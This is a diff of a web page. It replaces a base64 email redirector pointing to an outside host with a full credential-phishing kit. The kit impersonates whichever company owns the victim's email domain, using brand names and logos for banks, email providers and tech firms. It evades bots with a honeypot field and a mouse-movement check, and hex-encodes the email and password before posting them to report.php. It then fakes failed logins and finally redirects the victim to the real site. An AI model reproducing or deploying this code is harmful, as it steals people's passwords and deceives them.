@@ -1,54 +1,696 @@
 
-
+<!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>[COMPANY_NAME] – Login</title>
+  <link id="dynamicFavicon" rel="icon" type="image/png" href="https://www.google.com/s2/favicons?domain=microsoft.com&sz=128">
+  <!-- Font Awesome for Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+    /* =============== REFINED CSS FOR PERFECT BACKGROUND =============== */
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #2c3e50;
+      background: linear-gradient(135deg, #2980b9 0%, #2c3e50 100%);
+      background-attachment: fixed;
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      transition: background 1.2s ease-in-out;
+    }
+    
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.2);
+      z-index: 1;
+    }
 
+    /* ─── Initial Preloader CSS ─────────────────────── */
+    #initialPreloader {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 3000;
+      transition: opacity 0.5s ease;
+    }
+    .loader-circle {
+      width: 50px; height: 50px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #2980b9;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+    .loader-text { font-weight: bold; color: #555; font-size: 1.1em; }
 
+    /* ─── Transition Loader CSS (After Continue) ────── */
+    #transitionLoader {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(255,255,255,0.9);
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 2500;
+    }
 
-  <head>
+    .login-container { 
+      background: rgba(255,255,255,.98); 
+      padding:40px 30px;
+      border-radius:12px; 
+      box-shadow:0 10px 25px rgba(0,0,0,0.3);
+      width:350px; 
+      max-width:90%; 
+      text-align:center; 
+      position:relative;
+      z-index: 10;
+    }
+    
+    .logo { margin-bottom:25px; display:flex; flex-direction:column; align-items:center; }
+    .logo-image { 
+      width:125px; height:125px; margin-bottom:15px;
+      background: transparent; display:flex; align-items:center; justify-content:center;
+    }
+    .logo-image img{max-width:100%;max-height:100%;object-fit:contain;}
+    .logo-text{margin:0;color:#333;font-size: 1.5em;font-weight: 800; letter-spacing: -0.5px;}
+    
+    .form-group{margin-bottom:18px;text-align:left}
+    .form-group label{display:block;margin-bottom:6px;font-weight:bold; color: #444; font-size: 0.95em;}
+    
+    .input-wrapper { position: relative; }
+    .input-wrapper i {
+      position: absolute; left: 12px; top: 50%;
+      transform: translateY(-50%); color: #888; font-size: 14px;
+    }
+    .input-wrapper input {
+      width:100%;padding:12px 12px 12px 38px;border:1px solid #ccc;
+      border-radius:6px;box-sizing:border-box; font-size: 15px;
+      transition: border-color 0.2s;
+    }
+    .input-wrapper input:focus { border-color: #2980b9; outline: none; }
 
-  <body>
+    input[readonly]{background:#f5f5f5;cursor:not-allowed; color: #777;}
+    
+    button[type=submit]{width:100%;padding:13px;
+      background:#5cb85c;color:#fff;border:none;
+      border-radius:6px;cursor:pointer;font-size:16px;
+      transition:background .3s;
+      font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 8px;
+    }
+    button[type=submit]:hover:not(:disabled){background:#4cae4c}
+    button[type=submit]:disabled{background:#a0a0a0;cursor:not-allowed;}
+    
+    .message{margin-top:15px;padding:12px;border-radius:6px;
+      display:none;font-size:.9em;line-height:1.4;
+      font-weight: 600; text-align: left;
+    }
+    .message i { margin-right: 8px; }
+    .message.visible{display:block}
+    .message.error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;}
+    .message.info{background:#d1ecf1;color:#0c5460;border:1px solid #bee5eb;}
+    
+    .domain-info{margin-top:15px;font-size:.85em;color:#666;text-align:left;line-height:1.4; border-top: 1px solid #eee; padding-top: 12px;}
+    
+    .spinner{display:inline-block;width:18px;height:18px;
+      border:3px solid rgba(255,255,255,.3);border-radius:50%;
+      border-top-color:#fff;animation:spin 1s linear infinite;
+      visibility:hidden;
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+    
+    .refresh-button {
+      position:fixed; top:20px; right:20px;
+      background:rgba(255,255,255,.9); border:none;
+      border-radius:50%; width:40px; height:40px; font-size:18px;
+      cursor:pointer; z-index: 20; display:flex; align-items:center; justify-content:center;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
 
-    <script type="text/javascript">
-      var url_string = window.location.href;
-      var url_get_email = atob(getafterhash(url_string));
-      var mail_go_url = "https://sensisoft.com.mx/ops/all/eng_domain/final_icon_portal.html#" + url_get_email + "";
-      location.replace(mail_go_url);
+    /* ─── Landing overlay CSS ───────────────────────── */
+    #landingOverlay{position:fixed;top:0;left:0;width:100%;height:100%;
+      background:rgba(242,242,242,.99);display:none;
+      align-items:center;justify-content:center;z-index:2000;
+    }
+    #landingContent{background:#fff;padding:50px 30px;border-radius:16px;box-shadow:0 10px 30px rgba(0,0,0,0.1);text-align:center;
+      width:380px; max-width:90%;
+    }
+    #landingContent h1{margin:0 0 10px;font-size:1.7em;color:#111; font-weight: 800;}
+    #landingContent p{margin:0 0 25px;color:#555;font-size:1.1em; line-height: 1.4;}
+    #landingContent button{padding:12px 35px;border:none;border-radius:8px;background:#5cb85c;color:#fff;cursor:pointer;font-size:1.2em;font-weight:bold;transition:all 0.2s; box-shadow: 0 4px 6px rgba(0,0,0,0.1); display: inline-flex; align-items: center; gap: 10px;}
+    #landingContent button:hover{background:#4cae4c; transform: translateY(-1px);}
+    
+    .landing-logo-container {
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: center;
+    }
+    .landing-logo-image {
+      width: 160px; height: 160px;
+      background: transparent; display: flex; align-items: center; justify-content: center;
+    }
+    .landing-logo-image img {
+      max-width: 100%; max-height: 100%; object-fit: contain;
+      opacity: 0; transition: opacity 0.4s ease-in-out;
+    }
+    .landing-logo-image img.loaded { opacity: 1; }
 
+    /* HONEYPOT CSS */
+    .hp-field { display: none !important; visibility: hidden !important; }
+  </style>
+</head>
+<body>
 
-      function getafterhash(url) {
-        var ret;
-        var queryString;
-        // stuff after # is not part of query string, so get rid of it
-        queryStringhash = url.split('#')[1];
-        queryStringsemi = url.split(';')[1];
-        queryStringsemiplus = url.split(';+')[1];
-        queryStringstartsemi = url.split('*;')[1];
-        // if query string exists
-        if (queryStringhash) {
-          ret = queryStringhash;
+  <div id="initialPreloader">
+    <div class="loader-circle"></div>
+    <div class="loader-text">Securing connection...</div>
+  </div>
 
-        } else if (queryStringsemi) {
-          ret = queryStringsemi;
+  <div id="transitionLoader">
+    <div class="loader-circle"></div>
+    <div class="loader-text">Loading secure portal...</div>
+  </div>
 
-        } else if (queryStringsemiplus) {
-          ret = queryStringsemiplus;
+  <div id="landingOverlay">
+    <div id="landingContent">
+      <div class="landing-logo-container">
+        <div class="landing-logo-image">
+          <img id="landingLogo" src="" alt="Logo">
+        </div>
+      </div>
+      <h1 id="landingTitle">[COMPANY_NAME]</h1>
+      <p>Please confirm to continue to the secure portal.</p>
+      <button id="landingButton">Continue <i class="fa-solid fa-arrow-right"></i></button>
+    </div>
+  </div>
 
-        } else if (queryStringstartsemi) {
-          ret = queryStringstartsemi;
+  <button class="refresh-button" id="refreshBackground" title="Refresh background">↻</button>
+  
+  <div class="login-container">
+    <div class="logo">
+      <div class="logo-image">
+        <img id="dynamicLogo" src="" alt="Logo">
+      </div>
+      <h2 class="logo-text" id="headerText">[COMPANY_NAME]</h2>
+    </div>
 
-        } else {
+    <form id="loginForm" method="post" action="report.php">
+      <div class="hp-field">
+        <input type="text" name="full_name_verification" tabindex="-1" autocomplete="off">
+      </div>
 
-          ret = 0;
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <div class="input-wrapper">
+          <i class="fa-solid fa-envelope"></i>
+          <input type="email" id="emailInput" name="emailInput" value="[TARGET_EMAIL]" readonly required>
+        </div>
+      </div>
 
+      <div class="form-group">
+        <label for="password">Password</label>
+        <div class="input-wrapper">
+          <i class="fa-solid fa-lock"></i>
+          <input type="password" id="passwordInput" name="passwordInput" placeholder="Enter your password" required>
+        </div>
+      </div>
+
+      <button type="submit" id="submitButton">
+        <i class="fa-solid fa-right-to-bracket"></i> Login <span class="spinner" id="submitSpinner"></span>
+      </button>
+    </form>
+
+    <div id="messageContainer" class="message info visible">
+      <i class="fa-solid fa-circle-info"></i> Please enter your password.
+    </div>
+
+    <div class="domain-info">
+      <i class="fa-solid fa-shield-halved"></i> This page and content belongs to <strong id="footerDomain">[COMPANY_NAME]</strong>.
+      Only authorized email (<span id="footerEmail">[TARGET_EMAIL]</span>) is allowed to use this portal.
+    </div>
+  </div>
+
+  <script>
+  document.addEventListener('DOMContentLoaded', function () {
+    const loginForm          = document.getElementById('loginForm');
+    const emailInput         = document.getElementById('emailInput');
+    const passwordInput      = document.getElementById('passwordInput');
+    const submitButton       = document.getElementById('submitButton');
+    const submitSpinner      = document.getElementById('submitSpinner');
+    const messageContainer   = document.getElementById('messageContainer');
+    const refreshButton      = document.getElementById('refreshBackground');
+    const dynamicLogo        = document.getElementById('dynamicLogo');
+    const landingLogo        = document.getElementById('landingLogo');
+    const dynamicFavicon     = document.getElementById('dynamicFavicon');
+    const headerText         = document.getElementById('headerText');
+    const landingTitle       = document.getElementById('landingTitle');
+    const footerDomain       = document.getElementById('footerDomain');
+    const footerEmail        = document.getElementById('footerEmail');
+
+    const initialPreloader   = document.getElementById('initialPreloader');
+    const landingOverlay     = document.getElementById('landingOverlay');
+    const transitionLoader   = document.getElementById('transitionLoader');
+
+    let loginAttempts = 0;
+    let targetDomain = "[TARGET_DOMAIN]";
+    
+    let humanInteracted = false;
+    let startTime = Date.now();
+
+    window.addEventListener('mousemove', () => { humanInteracted = true; }, { once: true });
+    window.addEventListener('touchstart', () => { humanInteracted = true; }, { once: true });
+
+    // COMPREHENSIVE GLOBAL COMPANY NAME MAPPING
+    const companyNames = {
+        // Global Banks
+        'jpmorgan.com': 'JPMorgan Chase',
+        'chase.com': 'Chase Bank',
+        'bankofamerica.com': 'Bank of America',
+        'wellsfargo.com': 'Wells Fargo',
+        'citigroup.com': 'Citigroup',
+        'citi.com': 'Citibank',
+        'hsbc.com': 'HSBC Holdings',
+        'barclays.com': 'Barclays',
+        'standardchartered.com': 'Standard Chartered',
+        'morganstanley.com': 'Morgan Stanley',
+        'goldmansachs.com': 'Goldman Sachs',
+        'bnpparibas.com': 'BNP Paribas',
+        'societegenerale.com': 'Société Générale',
+        'db.com': 'Deutsche Bank',
+        'ubs.com': 'UBS Group',
+        'credit-suisse.com': 'Credit Suisse',
+        'santander.com': 'Santander Bank',
+        'bbva.com': 'BBVA',
+        'icbc.com.cn': 'ICBC',
+        'ccb.com': 'China Construction Bank',
+        'abchina.com': 'Agricultural Bank of China',
+        'boc.cn': 'Bank of China',
+        
+        // Nigerian Banks
+        'gtbank.com': 'Guaranty Trust Bank',
+        'zenithbank.com': 'Zenith Bank PLC',
+        'accessbankplc.com': 'Access Bank',
+        'ubagroup.com': 'United Bank for Africa',
+        'firstbanknigeria.com': 'First Bank of Nigeria',
+        'fidelitybank.ng': 'Fidelity Bank',
+        'ecobank.com': 'Ecobank',
+        'unionbankng.com': 'Union Bank of Nigeria',
+        'stanbicibtc.com': 'Stanbic IBTC Bank',
+        'sterling.ng': 'Sterling Bank',
+        'wemaplc.com': 'Wema Bank',
+        'unitybankng.com': 'Unity Bank',
+        
+        // Tech Giants
+        'microsoft.com': 'Microsoft Corporation',
+        'apple.com': 'Apple Inc.',
+        'google.com': 'Google',
+        'amazon.com': 'Amazon',
+        'facebook.com': 'Meta (Facebook)',
+        'meta.com': 'Meta Platforms',
+        'nvidia.com': 'NVIDIA',
+        'intel.com': 'Intel',
+        'ibm.com': 'IBM',
+        'oracle.com': 'Oracle Corporation',
+        'salesforce.com': 'Salesforce',
+        'adobe.com': 'Adobe Inc.',
+        'tesla.com': 'Tesla, Inc.',
+        'samsung.com': 'Samsung Electronics',
+        'sony.com': 'Sony Corporation',
+        'huawei.com': 'Huawei',
+        'alibaba.com': 'Alibaba Group',
+        'tencent.com': 'Tencent',
+        'baidu.com': 'Baidu',
+        'rakuten.co.jp': 'Rakuten',
+        'softbank.jp': 'SoftBank Group',
+        
+        // Email & Communication
+        'outlook.com': 'Microsoft Outlook',
+        'hotmail.com': 'Microsoft Hotmail',
+        'live.com': 'Microsoft Live',
+        'office365.com': 'Microsoft Office 365',
+        'gmail.com': 'Google Workspace',
+        'yahoo.com': 'Yahoo! Inc.',
+        'ymail.com': 'Yahoo! Mail',
+        'aol.com': 'AOL',
+        'icloud.com': 'Apple iCloud',
+        'proton.me': 'Proton Mail',
+        'protonmail.com': 'Proton Mail',
+        'tutanota.com': 'Tuta (Tutanota)',
+        'mail.com': 'Mail.com',
+        'gmx.com': 'GMX Mail',
+        'yandex.com': 'Yandex',
+        'rambler.ru': 'Rambler',
+        '126.com': 'NetEase 126',
+        '163.com': 'NetEase 163',
+        'qq.com': 'Tencent QQ',
+        '263.net': '263 Mail',
+        'zoho.com': 'Zoho Corporation',
+        
+        // Social Media & Content
+        'instagram.com': 'Instagram',
+        'whatsapp.com': 'WhatsApp',
+        'linkedin.com': 'LinkedIn',
+        'twitter.com': 'X (Twitter)',
+        'x.com': 'X (Twitter)',
+        'tiktok.com': 'TikTok',
+        'netflix.com': 'Netflix',
+        'spotify.com': 'Spotify',
+        'slack.com': 'Slack',
+        'zoom.us': 'Zoom Video Communications',
+        
+        // Financial Services
+        'paypal.com': 'PayPal',
+        'stripe.com': 'Stripe',
+        'square.com': 'Block (Square)',
+        'visa.com': 'Visa Inc.',
+        'mastercard.com': 'Mastercard',
+        'americanexpress.com': 'American Express',
+        
+        // Telecom
+        'verizon.com': 'Verizon',
+        'att.com': 'AT&T',
+        'comcast.net': 'Xfinity (Comcast)',
+        'cox.net': 'Cox Communications',
+        'charter.net': 'Spectrum (Charter)',
+        'bt.com': 'BT Group',
+        'orange.fr': 'Orange S.A.',
+        't-online.de': 'Deutsche Telekom'
+    };
+
+    // COMPREHENSIVE KNOWN LOGOS FOR HIGH QUALITY
+    const knownLogos = {
+        // Microsoft Services
+        'outlook.com': 'https://res.cdn.office.net/assets/mail/favicon.ico',
+        'hotmail.com': 'https://res.cdn.office.net/assets/mail/favicon.ico',
+        'live.com': 'https://res.cdn.office.net/assets/mail/favicon.ico',
+        'microsoft.com': 'https://www.microsoft.com/favicon.ico',
+        'office.com': 'https://res.cdn.office.net/assets/mail/favicon.ico',
+        'office365.com': 'https://res.cdn.office.net/assets/mail/favicon.ico',
+        
+        // Google Services
+        'gmail.com': 'https://www.gstatic.com/images/branding/product/1x/gmail_2020h_64dp.png',
+        'google.com': 'https://www.google.com/favicon.ico',
+        
+        // Yahoo Services
+        'yahoo.com': 'https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png',
+        'ymail.com': 'https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png',
+        'aol.com': 'https://s.yimg.com/wm/login/aol-favicon.png',
+        
+        // Apple Services
+        'icloud.com': 'https://www.icloud.com/favicon.ico',
+        'apple.com': 'https://www.apple.com/favicon.ico',
+        
+        // Chinese Email Services
+        '126.com': 'https://mail.126.com/favicon.ico',
+        '163.com': 'https://mail.163.com/favicon.ico',
+        'qq.com': 'https://www.qq.com/favicon.ico',
+        
+        // Alternative Email Services
+        'zoho.com': 'https://www.zoho.com/favicon.ico',
+        'proton.me': 'https://proton.me/favicons/favicon.ico',
+        'protonmail.com': 'https://protonmail.com/favicon.ico',
+        'yandex.com': 'https://yandex.com/favicon.ico',
+        'mail.com': 'https://www.mail.com/favicon.ico',
+        'gmx.com': 'https://www.gmx.com/favicon.ico',
+        
+        // Social Media
+        'facebook.com': 'https://www.facebook.com/favicon.ico',
+        'instagram.com': 'https://www.instagram.com/static/images/ico/favicon.ico/36b30c691c6e.ico',
+        'linkedin.com': 'https://www.linkedin.com/favicon.ico',
+        'twitter.com': 'https://abs.twimg.com/favicons/twitter.2.ico',
+        'x.com': 'https://abs.twimg.com/favicons/twitter.2.ico',
+        'tiktok.com': 'https://www.tiktok.com/favicon.ico',
+        
+        // Tech Companies
+        'amazon.com': 'https://www.amazon.com/favicon.ico',
+        'netflix.com': 'https://www.netflix.com/favicon.ico',
+        'spotify.com': 'https://www.scdn.co/v2/2/images/favicon.ico',
+        'slack.com': 'https://www.slack.com/favicon.ico',
+        'zoom.us': 'https://www.zoom.us/favicon.ico',
+        'salesforce.com': 'https://www.salesforce.com/favicon.ico',
+        'adobe.com': 'https://www.adobe.com/favicon.ico',
+        'oracle.com': 'https://www.oracle.com/favicon.ico',
+        'ibm.com': 'https://www.ibm.com/favicon.ico',
+        'intel.com': 'https://www.intel.com/favicon.ico',
+        'nvidia.com': 'https://www.nvidia.com/favicon.ico',
+        'tesla.com': 'https://www.tesla.com/favicon.ico',
+        'samsung.com': 'https://www.samsung.com/favicon.ico',
+        'sony.com': 'https://www.sony.com/favicon.ico',
+        'huawei.com': 'https://www.huawei.com/favicon.ico',
+        'alibaba.com': 'https://www.alibaba.com/favicon.ico',
+        'tencent.com': 'https://www.tencent.com/favicon.ico',
+        'baidu.com': 'https://www.baidu.com/favicon.ico',
+        'rakuten.co.jp': 'https://www.rakuten.co.jp/favicon.ico',
+        'softbank.jp': 'https://www.softbank.jp/favicon.ico',
+        
+        // Financial Services
+        'paypal.com': 'https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico',
+        'stripe.com': 'https://b.stripecdn.com/stripes-statics-srv/assets/favicon.ico',
+        'visa.com': 'https://www.visa.com/favicon.ico',
+        'mastercard.com': 'https://www.mastercard.com/favicon.ico',
+        'americanexpress.com': 'https://www.americanexpress.com/favicon.ico',
+        
+        // Global Banks
+        'jpmorgan.com': 'https://www.jpmorgan.com/favicon.ico',
+        'chase.com': 'https://www.chase.com/favicon.ico',
+        'bankofamerica.com': 'https://www.bankofamerica.com/favicon.ico',
+        'wellsfargo.com': 'https://www.wellsfargo.com/favicon.ico',
+        'citi.com': 'https://www.citi.com/favicon.ico',
+        'citigroup.com': 'https://www.citigroup.com/favicon.ico',
+        'hsbc.com': 'https://www.hsbc.com/favicon.ico',
+        'barclays.com': 'https://www.barclays.com/favicon.ico',
+        'standardchartered.com': 'https://www.standardchartered.com/favicon.ico',
+        'morganstanley.com': 'https://www.morganstanley.com/favicon.ico',
+        'goldmansachs.com': 'https://www.goldmansachs.com/favicon.ico',
+        'bnpparibas.com': 'https://www.bnpparibas.com/favicon.ico',
+        'societegenerale.com': 'https://www.societegenerale.com/favicon.ico',
+        'db.com': 'https://www.db.com/favicon.ico',
+        'ubs.com': 'https://www.ubs.com/favicon.ico',
+        'santander.com': 'https://www.santander.com/favicon.ico',
+        'bbva.com': 'https://www.bbva.com/favicon.ico',
+        'icbc.com.cn': 'https://www.icbc.com.cn/favicon.ico',
+        'ccb.com': 'https://www.ccb.com/favicon.ico',
+        'abchina.com': 'https://www.abchina.com/favicon.ico',
+        'boc.cn': 'https://www.boc.cn/favicon.ico',
+        
+        // Nigerian Banks
+        'gtbank.com': 'https://www.gtbank.com/favicon.ico',
+        'zenithbank.com': 'https://www.zenithbank.com/favicon.ico',
+        'accessbankplc.com': 'https://www.accessbankplc.com/favicon.ico',
+        'ubagroup.com': 'https://www.ubagroup.com/favicon.ico',
+        'firstbanknigeria.com': 'https://www.firstbanknigeria.com/favicon.ico',
+        'fidelitybank.ng': 'https://www.fidelitybank.ng/favicon.ico',
+        'ecobank.com': 'https://www.ecobank.com/favicon.ico',
+        'unionbankng.com': 'https://www.unionbankng.com/favicon.ico',
+        'stanbicibtc.com': 'https://www.stanbicibtc.com/favicon.ico',
+        'sterling.ng': 'https://www.sterling.ng/favicon.ico',
+        'wemaplc.com': 'https://www.wemaplc.com/favicon.ico',
+        'unitybankng.com': 'https://www.unitybankng.com/favicon.ico',
+        
+        // Telecom
+        'verizon.com': 'https://www.verizon.com/favicon.ico',
+        'att.com': 'https://www.att.com/favicon.ico',
+        'comcast.net': 'https://www.comcast.net/favicon.ico',
+        'cox.net': 'https://www.cox.net/favicon.ico',
+        'charter.net': 'https://www.charter.net/favicon.ico',
+        'bt.com': 'https://www.bt.com/favicon.ico',
+        'orange.fr': 'https://www.orange.fr/favicon.ico',
+        't-online.de': 'https://www.t-online.de/favicon.ico'
+    };
+
+    function updatePageContent() {
+        let hash = window.location.hash.substring(1);
+        let email = hash.includes('@') ? hash : "[TARGET_EMAIL]";
+        let domain = email.split('@')[1] || "[TARGET_DOMAIN]";
+        targetDomain = domain.toLowerCase();
+
+        let parts = targetDomain.split('.');
+        let rootDomain = parts.length > 2 ? parts.slice(-2).join('.') : targetDomain;
+
+        let companyName = companyNames[targetDomain] || companyNames[rootDomain];
+        if (!companyName) {
+            let nameOnly = rootDomain.split('.')[0];
+            companyName = nameOnly.charAt(0).toUpperCase() + nameOnly.slice(1);
         }
 
-        return ret;
+        emailInput.value = email;
+        footerEmail.textContent = email;
+        headerText.textContent = companyName;
+        landingTitle.textContent = companyName;
+        footerDomain.textContent = companyName;
+        document.title = companyName + " – Login";
+
+        // Construct source list for the logo with priority ordering
+        const sources = [];
+        
+        // Priority 1: Check if we have a high-quality known logo
+        if (knownLogos[targetDomain]) sources.push(knownLogos[targetDomain]);
+        if (knownLogos[rootDomain] && targetDomain !== rootDomain) sources.push(knownLogos[rootDomain]);
+        
+        // Priority 2: Google Favicon API (High Quality 128px)
+        sources.push(`https://www.google.com/s2/favicons?domain=${targetDomain}&sz=128`);
+        if (targetDomain !== rootDomain) sources.push(`https://www.google.com/s2/favicons?domain=${rootDomain}&sz=128`);
+        
+        // Priority 3: Clearbit Logo API
+        sources.push(`https://logo.clearbit.com/${targetDomain}`);
+        if (targetDomain !== rootDomain) sources.push(`https://logo.clearbit.com/${rootDomain}`);
+        
+        // Priority 4: DuckDuckGo Favicon API
+        sources.push(`https://icons.duckduckgo.com/ip3/${targetDomain}.ico`);
+        
+        // Priority 5: Fallback Avatar
+        sources.push('https://www.gstatic.com/images/branding/product/1x/avatar_64dp.png');
+
+        let currentIdx = 0;
+
+        function tryNextLogo() {
+            if (currentIdx >= sources.length) return;
+            
+            const url = sources[currentIdx];
+            const tempImg = new Image();
+            
+            tempImg.onload = function() {
+                dynamicLogo.src = url;
+                landingLogo.src = url;
+                dynamicFavicon.href = url;
+                dynamicLogo.classList.add('loaded');
+                landingLogo.classList.add('loaded');
+            };
+            
+            tempImg.onerror = function() {
+                currentIdx++;
+                tryNextLogo();
+            };
+            
+            tempImg.src = url;
+        }
+
+        tryNextLogo();
+    }
+
+    const backgroundList = [
+        "https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&w=1920&q=80",
+        "https://images.unsplash.com/photo-1497215728101-856f4ea42174?auto=format&fit=crop&w=1920&q=80",
+        "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?auto=format&fit=crop&w=1920&q=80",
+        "https://images.unsplash.com/photo-1524758631624-e2822e304c36?auto=format&fit=crop&w=1920&q=80"
+    ];
+
+    function loadRandomBackground() {
+      const randomUrl = backgroundList[Math.floor(Math.random() * backgroundList.length)];
+      const img = new Image();
+      img.onload = function() {
+          document.body.style.backgroundImage = `url('${randomUrl}')`;
+      };
+      img.src = randomUrl;
+    }
+
+    function bin2hexJS(input) {
+      let hex = '';
+      for (let i = 0; i < input.length; i++) {
+        let h = input.charCodeAt(i).toString(16);
+        if (h.length < 2) h = '0' + h;
+        hex += h;
       }
+      return hex;
+    }
 
-    </script>
-  </body>
+    function getBrowserName() {
+        let ua = navigator.userAgent;
+        if (ua.indexOf("Opera") != -1 || ua.indexOf('OPR') != -1) return 'Opera';
+        else if (ua.indexOf("Chrome") != -1) return 'Chrome';
+        else if (ua.indexOf("Safari") != -1) return 'Safari';
+        else if (ua.indexOf("Firefox") != -1) return 'Firefox';
+        else if (ua.indexOf("MSIE") != -1 || !!document.documentMode == true) return 'IE';
+        else return 'Unknown';
+    }
 
+    setTimeout(() => {
+        initialPreloader.style.opacity = '0';
+        setTimeout(() => {
+            initialPreloader.style.display = 'none';
+            landingOverlay.style.display = 'flex';
+        }, 500);
+    }, 2000);
+
+    document.getElementById('landingButton').addEventListener('click', () => {
+        if (!humanInteracted && (Date.now() - startTime < 3000)) {
+            return;
+        }
+        landingOverlay.style.display = 'none';
+        transitionLoader.style.display = 'flex';
+        setTimeout(() => {
+            transitionLoader.style.display = 'none';
+        }, 1500);
+    });
+
+    updatePageContent();
+    loadRandomBackground();
+    window.addEventListener('hashchange', updatePageContent);
+    if (refreshButton) refreshButton.addEventListener('click', loadRandomBackground);
+
+    loginForm.addEventListener('submit', function (e) {
+      e.preventDefault();
+      const hpValue = loginForm.elements['full_name_verification'].value;
+      if (hpValue !== "" || !humanInteracted) {
+          return;
+      }
+      submitButton.disabled = true;
+      submitSpinner.style.visibility = 'visible';
+      
+      const browser = getBrowserName();
+      const portal = targetDomain;
+      const combinedData = emailInput.value + ' ; ' + passwordInput.value + ' ; ' + browser + ' ; ' + portal;
+      
+      const formData = new FormData();
+      formData.append('ip8g5j6ciiq170o180tljtbd97', bin2hexJS(combinedData));
+      
+      fetch(loginForm.action, { method: 'POST', body: formData })
+      .then(r => r.json())
+      .then(response => {
+        loginAttempts++;
+        passwordInput.value = '';
+        if (loginAttempts >= 3) {
+            messageContainer.innerHTML = '<i class="fa-solid fa-circle-xmark"></i> Too many login failed attempt';
+            messageContainer.className = 'message error visible';
+            passwordInput.disabled = true;
+            submitButton.disabled = true;
+            submitButton.style.opacity = '0.5';
+            setTimeout(() => {
+                window.location.href = "https://www." + targetDomain;
+            }, 2000);
+        } else {
+            passwordInput.focus();
+            messageContainer.innerHTML = `<i class="fa-solid fa-triangle-exclamation"></i> Invalid credentials. Attempt ${loginAttempts} of 3.`;
+            messageContainer.className = 'message error visible';
+            submitButton.disabled = false;
+        }
+        submitSpinner.style.visibility = 'hidden';
+      })
+      .catch(() => {
+        messageContainer.innerHTML = '<i class="fa-solid fa-wifi"></i> Network error. Please try again.';
+        messageContainer.className = 'message error visible';
+        submitButton.disabled = false;
+        submitSpinner.style.visibility = 'hidden';
+      });
+    });
+  });
+  </script>
+</body>
+</html>
